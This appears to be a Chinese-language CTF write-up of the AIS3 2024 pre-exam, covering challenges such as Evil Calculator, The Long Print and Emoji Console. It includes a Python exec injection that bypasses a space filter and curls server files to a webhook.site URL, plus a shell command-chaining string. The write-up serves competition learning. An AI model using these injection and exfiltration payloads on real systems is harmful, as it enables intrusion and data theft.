---
lang: zh-TW
title: "AIS3 2024 Pre-Exam Writeup"
tags: [ "Cyber Security", "Competition", "CTF Writeup" ]
authors: [ "XinShou" ]
type: post
showTableOfContents: true
date: 2024-05-29
---

## Evil Calculator

這題會先移除掉空格與底線，目標是製作一個不包含那兩個符號的Payload，將資料發送到自己的webhook。

我將空格改成 chr(32)，底線在Payload中沒有使用到

```py {linenos=inline}
# exec("import os; os.system(\'cat flag.txt\')")
#
# $(curl -XPOST https://webhook.site/b73912c2-79c8-4062-8d33-acf91d9d27cf -d "$(ls)") #


import requests

txt = r'exec("import"+chr(32)+"os;"+chr(32)+"os.system(\'curl"+chr(32)+"-XPOST"+chr(32)+"https://webhook.site/da2c3866-c9fe-453c-b079-a7146b7b6347"+chr(32)+"-d"+chr(32)+"\"$(cat"+chr(32)+"../*)\"\')")'
# eval(txt)  # 測試結果是否成功
print(' ' in txt)
print(requests.post(r'http://chals1.ais3.org:5001/calculate', json={'expression': txt}).json())
```

比賽截圖
![image](https://hackmd.io/_uploads/r11J_RRXC.png)

writeup截圖
![image](https://hackmd.io/_uploads/Sk4P0LD4C.png)

Flag: `AIS3{7RiANG13_5NAK3_I5_50_3Vi1}`

<br/><br/><br/><br/><br/>

## The Long Print

Ida 修改流程即可拿到Flag。我將每次傳入sleep的arg (`rdi`)都更改為0，這樣就可以規避掉sleep函數的長等待。這雖然不是最好的解法，但當下只有想到這樣。

writeup截圖
![image](https://hackmd.io/_uploads/ryvJ1Dv4A.png)
![image](https://hackmd.io/_uploads/S1Fl1PP40.png)
![image](https://hackmd.io/_uploads/rkqzkvvEA.png)

Flag: `AIS3{You_are_the_master_of_time_management!!!!?}`

<br/><br/><br/><br/><br/>

## Quantum Nim Heist

亂亂按就發現大問題了，Enter, Enter, get flag

比賽截圖
![image](https://hackmd.io/_uploads/HkEjm1J4C.png)

writeup截圖
![image](https://hackmd.io/_uploads/H1uUyDDEC.png)
![image](https://hackmd.io/_uploads/H13PyvP40.png)
![image](https://hackmd.io/_uploads/SyzOJDPVC.png)

Flag: `AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}`

<br/><br/><br/><br/><br/>

## Emoji Console

原本只想透過 `;` 與 `$()` 試著湊出來，但一直沒有成功。到最最最後才亂撞出 `;` 搭配 `|` 可以湊出多指令執行

最後使用的語法 `cd flag;p:|python flag-print*)`

![image](https://hackmd.io/_uploads/SkatC9eVC.png)
![image](https://hackmd.io/_uploads/SJLsC9gNA.png)

<br/><br/><br/><br/><br/>

## Three Dimensional Secret

打開pcapng後，follow其中可疑的TCP，發現到以下內容。截取片段讓GPT分析，並得知為G-Code語法，丟到線上網站便可得到Flag

![image](https://hackmd.io/_uploads/HJGMbDPE0.png)
![image](https://hackmd.io/_uploads/ryK9bwv4R.png)
![image](https://hackmd.io/_uploads/BJlRWvPNR.png)

<br/><br/><br/><br/><br/>

## Welcome

這題看起來挺難的，一開時沒注意到落後了一大截ＱＱ

![image](https://hackmd.io/_uploads/SyLeMwDVR.png)